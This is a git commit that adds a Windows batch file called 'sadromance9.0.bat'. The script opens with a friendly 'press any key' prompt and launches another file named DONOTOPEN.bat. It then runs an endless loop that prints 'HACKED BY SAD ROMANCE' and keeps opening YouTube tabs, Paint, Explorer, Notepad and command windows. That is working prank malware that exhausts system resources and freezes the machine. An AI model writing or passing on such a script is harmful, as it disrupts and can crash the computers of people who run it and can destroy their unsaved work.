012d4a92b64cd06c02d89a034fae3b45a0223248
ilushka_boy10 <ilushkaboyilusa@gmail.com>
2025-10-26 23:19:07 +0300

    Create sadromance9.0.bat

---
+++ sadromance9.0.bat
@@ -0,0 +1,17 @@
+@echo off
+title Sad Romance
+color e
+echo hi there! press any key if you want!
+pause
+start DONOTOPEN.bat
+color 4
+:hacked
+echo HACKED BY SAD ROMANCE
+start https://www.youtube.com/watch?v=ja7JAJNe8a0
+start https://www.youtube.com/watch?v=ja7JAJNe8a0
+start https://www.youtube.com/watch?v=ja7JAJNe8a0
+start mspaint
+start explorer
+start notepad
+start cmd
+goto hacked
